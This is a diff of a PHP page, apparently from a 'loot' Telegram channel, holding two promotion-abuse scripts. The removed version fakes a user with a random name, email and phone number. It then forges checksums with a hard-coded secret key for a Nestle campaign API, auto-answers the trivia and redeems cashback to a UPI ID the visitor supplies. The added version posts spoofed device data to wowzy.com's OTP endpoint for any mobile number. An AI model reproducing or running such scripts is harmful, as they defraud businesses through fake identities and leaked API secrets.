@@ -1,273 +1,110 @@
-<script>if(top!=self){ top.location.replace(document.location); alert("No sir! Aap isko copy nhi kr skte.Join @loot_1970")}</script>
- <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rahul</title>
-    <style>
-        input[type=text], [type=number], select {
-            width: 100%;
-            padding: 12px 20px;
-            margin: 8px 0;
-            display: inline-block;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        input[type=submit] {
-            width: 60%;
-            background-color: #4CAF50;
-            color: white;
-            padding: 14px 20px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        input[type=submit]:hover {
-            background-color: #45a049;
-        }
-        div {
-            border-radius: 5px;
-            background-color: #f2f2f2;
-            padding: 20px;
-        }
-    </style>
+<body style='background-color:White'>
+
+   <html><head><title>FREE</title> <meta name="viewport" content="width=device-width"><style>
+input[type=text],[type=number], select {
+    width: 100%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+}input[type=submit] {
+    width: 60%;
+    background-color: #4CAF50;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;}input[type=submit]:hover {
+    background-color: #45a049;}div {
+    border-radius: 5px;
+    background-color: #f2f2f2;
+    padding: 20px;
+}.error {background:#ffebe8; border:1px solid #dd3c10; padding:2px; text-align:center; font-weight:normal; color:maroon;}.success {background:#fff8cc; border:1px solid #ffe222; padding:10px; text-align:center; font-weight:normal; color:#000;}</head>
+
+</style></head><title></title><body><center><b><font color='black' size='3'><hr>free<center><hr>
+
+       
     
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-</head>
-<body style="background-color: White;">
-    <center><b><font color="black" size="3"><hr>free <center><hr>
-    	
  
- 
+     
+     
+     
 <?php
 
-
-
-if (!isset($_POST['submit'])) {
-    echo "<form method='POST' action=''>
-        <input type='text' name='upi' class='input' placeholder='Enter Your UPI' required />
-        <input type='submit' value='Transfer' name='submit' class='submit'>
-    </form>";
-    
-   
- 
-    
-} elseif (isset($_POST['submit'])) {
-    $upi = $_POST['upi'];
-$f = array("Vasu","Nirmal","Akshay","Chander","Rupinder","Akhil","Shanti","Ravi","Kunal","Chandrakant","Sulabha","Mahinder","Swapnil","Deepa","Sulabha","Neelima","Vijaya","Nikhil","Isha","Siddhi","Ajeet","Kshitija","Anila","Jitender","Sumeet","Preethi","Priti","Gayathri","Dhaval","Mukesh","Lalita","Rachana","Rakhi","Harshal","Shekhar","Rajiv","Balakrishna","Ajeet","Tara","Chander","Deepa","Prabhu","Rajendra","Jeetendra","Nandu","Aniket","Sumati","Prabhu","Vimal","Indira","Laxman","Agni","Kapil","Kailash","Puneet","Pratik","Pankaj","Ishore","Swati","Rupa","Hardeep","Prabhu","Khushi","Gurmeet","Nishant","Rishi","Naveen");
-$fname = $f[mt_rand(0,60)];
-$email = $fname . mt_rand(1000,9000) . "@gmail.com";
-
-function generateIndianMobileNumber() {
-    $prefixes = [6, 7, 8, 9]; 
-    $firstDigit = $prefixes[array_rand($prefixes)];
-    $remainingDigits = mt_rand(100000000, 999999999); 
-
-    return $firstDigit . $remainingDigits;
+if(!isset($_POST['submit'])){
+    echo"<form action='' method='POST'>
+    <input type='text' class='input' name='mo' placeholder='Enter Mobile Number' required>
+    <input type='submit' class='submit' name='submit' value='login'>";
 }
 
-
-$num = generateIndianMobileNumber();
-
-
-function sha256($data) {
-    return hash('sha256', $data);
-}
-
-function sortJsonBody($json) {
-    try {
-        if (!$json || trim($json) === "") {
-            return "";
+if(isset($_POST['submit'])){
+    
+    error_reporting(0);
+    
+    function random($length){
+        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
+        $charactersLength = strlen($characters);
+        $randomString = '';
+        for ($i = 0; $i < $length; $i++){
+            $randomString .= $characters[rand(0, $charactersLength - 1)];
         }
-        
-        $decoded = json_decode($json, true);
-        
-        if (!is_array($decoded)) {
-            throw new Exception("Invalid JSON format");
+        return $randomString;
+    }
+    
+    function randomnumber($length){
+        $str = "";
+        for($i = 0; $i < $length; $i++){
+            $str .= mt_rand(0,9);
         }
-        
-        krsort($decoded); 
-        return json_encode($decoded, JSON_UNESCAPED_SLASHES);
-    } catch (Exception $e) {
-        error_log("Error parsing or sorting the JSON body: " . $e->getMessage());
-        return "";
+        return $str;
     }
-}
-
-function generateChecksum($data, $secretKey) {
-    $secretHash = sha256($secretKey);
-    $sortedBody = sortJsonBody($data);
-
-    $checksumInput = ($sortedBody !== "" && $sortedBody !== "{}") ? $secretHash . $sortedBody : $secretHash;
-    return sha256($checksumInput);
-}
-
-function httpCall($url, $method = "POST", $jsonBody = null, $headers = []) {
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, strtoupper($method));
-
-    if ($jsonBody) {
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonBody);
-        $headers[] = "Content-Length: " . strlen($jsonBody);
-    }
-
-    if (!empty($headers)) {
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    }
-
-    $response = curl_exec($ch);
-    curl_close($ch);
-
-    return $response; 
-}
-
-
-$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-user-detail";
-
-
-$data = '{"msisdn":"'.$num.'","firstName":"'.$fname.'","lastName":"","emailId":"'.$email.'","howOldIsYourKid":"Between 2-6 Years Old","state":"Delhi","consent1":true,"consent2":true,"isLoginAllowed":false,"ssoId":"NA"}';
-
-
-$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");
-
-
-$headers = [
-    "Content-Type: application/json",
-    "Accept: application/json",
-    "checksum: $checksum",
-    "msisdn: $num",
-    "campaignId: 1",
-    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
-    "appVersion: 1.0",
-    "appName: asknestle",
-    "channel: WEB",
-    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
-];
-
-
-
-
-
-
-$response = httpCall($url, "POST", $data, $headers);
-
-//echo"$response ";
-
-
-$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-answers";
-
-
-$data = '{"msisdn":"'.$num.'","answersMap":{"trivia1":{"answer":"Carbohydrate","question":"Which nutrient is the major source of energy for the body?","isCorrect":true},"trivia2":{"answer":"It has nutrients for good gut health","question":"This is a benefit of eating curd?","isCorrect":true},"trivia3":{"answer":"2000 kcal","question":"What is the average energy requirement for an adult per day?","isCorrect":true},"trivia4":{"answer":"Milk & milk products","question":"Fiber rich food does not include?","isCorrect":true},"trivia5":{"answer":"Guava","question":"Which among these is NOT a good source of vitamin A?","isCorrect":true}}}';
-
-
-
-$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");
-
-
-$headers = [
-    "Content-Type: application/json",
-    "Accept: application/json",
-    "checksum: $checksum",
-    "msisdn: $num",
-    "campaignId: 1",
-    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
-    "appVersion: 1.0",
-    "appName: asknestle",
-    "channel: WEB",
-    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
-];
-
-
-$response = httpCall($url, "POST", $data, $headers);
-
-//echo"$response";
-
-
-$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/save-upi-info";
-
-
-$data = '{"vpa":"'.$upi.'"}';
-
-
-$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");
-
-
-$headers = [
-    "Content-Type: application/json",
-    "Accept: application/json",
-    "checksum: $checksum",
-    "msisdn: $num",
-    "campaignId: 1",
-    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
-    "appVersion: 1.0",
-    "appName: asknestle",
-    "channel: WEB",
-    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
-];
-
-
-
-$response = httpCall($url, "POST", $data, $headers);
-$json = json_decode($response, true);
-$msg=$json["msg"];
-if($json['status']==='SUCCESS'){
- 
-
-$url = "https://web.myfidelity.in/api/v1/nestle-asknestle/redemption";
-
-
-
-$data = '{"redemptionType":"CASHBACK"}';
-
-$checksum = generateChecksum($data, "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@");
-
-
-$headers = [
-    "Content-Type: application/json",
-    "Accept: application/json",
-    "checksum: $checksum",
-    "msisdn: $num",
-    "campaignId: 1",
-    "clientId: nwHM0EqOVH6c/5J7SZ0w36EXMBoGMIlaXTeL4qN63KE=",
-    "appVersion: 1.0",
-    "appName: asknestle",
-    "channel: WEB",
-    "User-Agent: Mozilla/5.0 (Linux; Android 14; RMX3870 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36"
-];
-
-
-
-$response = httpCall($url, "POST", $data, $headers);
-
-$json = json_decode($response, true);
-$msg=$json["msg"];
-if ($json['status'] === 'SUCCESS') {
-   
-echo "$msg";
-echo"$response";
-
-
-
-echo"<meta http-equiv='refresh' content=669;url=tg://resolve?domain=loot_1970>";
-        
-        
-} else {
     
-    echo "$msg"; 
-    echo"<meta http-equiv='refresh' content=699;url=tg://resolve?domain=loot_1970>";
-
-
-}
-} else {
-    
- echo "$msg"; 
- echo"<meta http-equiv='refresh' content=789;url=tg://resolve?domain=loot_1970>";}}
+    $inm=randomnumber(30);
+    $mo = $_POST['mo'];
+    $otp = $_POST['otp'];
  
- 
+$data='{"email":"","mobile":"'.$mo.'","geoLocState":"","state":"","nae":{"gaid":"0b32d04f-d4a7-45e0-9fe4-4bf9b21f7b5e","appVersion":"5601.12","clientTime":1740074578536,"dpi":0,"deviceId":"44c7df13a7bf991f","isDeviceRooted":0,"limitAdwrdsTrckngStatus":"0","os":"Android","osVersion":"10","screenSize":5.7,"device_arch_info":"64Bit","device_os_32_bit_supported":"true","device_os_64_bit_supported":"true","is32BitBuild":"0","utmParams":{"reqQueryParams":{"install_time":"2025-02-20 18:02:31.496","af_message":"organic install","af_status":"Organic","is_first_launch":true}},"dataSent":true,"install_flag":1,"device_manufacturer":"Xiaomi","distribution_medium":"PLAYSTORE","device_model":"Redmi 8","connection_type":"NETWORK_TYPE_LTE","channelId":"6003","appsflyerId":"1740074540510-5699449572024443990","firebase_app_instance_id":"b8caab714e1f8e08dd6e762a4136c0ce","action":"getNaeAttribution"},"whatsappAlerts":false}';
+
+$reshead[]='Host: www.wowzy.com';
+$reshead[]='application/json, text/plain, */*';
+$reshead[]='user-agent: {"AppVersion":"5601.12","OSVersion":"10","appFlavorName":"ludo_lite","reverieFlavorName":"ludo_lite","pokerFlavourName":"","ludoFlavourName":"ludo_lite","isRCOnly":false}Mozilla/5.0 (Linux; Android ; ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36 [WOWZYLiteAndroid/5601.12]';
+$reshead[]='content-type: application/json ';
+$reshead[]='cookie: sameSiteNoneSupported=true';
+
+$ch=curl_init();
+curl_setopt($ch,CURLOPT_URL,'https://www.wowzy.com/api/fl/auth/v3/getOtp');
+curl_setopt($ch,CURLOPT_POST,1);
+curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch,CURLOPT_HTTPHEADER,$reshead);
+curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,true);
+$output=curl_exec($ch);
+$json=json_decode($output,true);
+$success = $json['success'];
+$data = $json['data'];
+$ageAbove18 = $json['data']['ageAbove18'];
+$otpTransactionId = $json['data']['otpTransactionId'];
+$regProductType = $json['data']['regProductType'];
+$isExistingUser = $json['data']['isExistingUser'];
+$playcircle = $json['data']['playcircle'];
+$authStatus = $json['data']['authStatus'];
+$mobile = $json['data']['mobile'];
+$userInput = $json['data']['userInput'];
+$uniqueIdentifier = $json['data']['uniqueIdentifier'];
+ if($success = "success"){
+echo"<br><font color='green'>Otp sended success</font><br><br>";
+echo"<form action='reg.php' method='POST'>
+<input type='hidden' name='mo' value='$mo' required>
+ <input type='hidden' name='otp' value='$otp' required>
+ <input type='text' class='input' name='otp' placeholder='Enter OTP' required>
+ <input type='submit' class='submit' name='submit' value='Submit'>";
+        
+    }else{
+echo"<br><font color='red'>$output<br></font>";
+
+ }}
+
 ?>
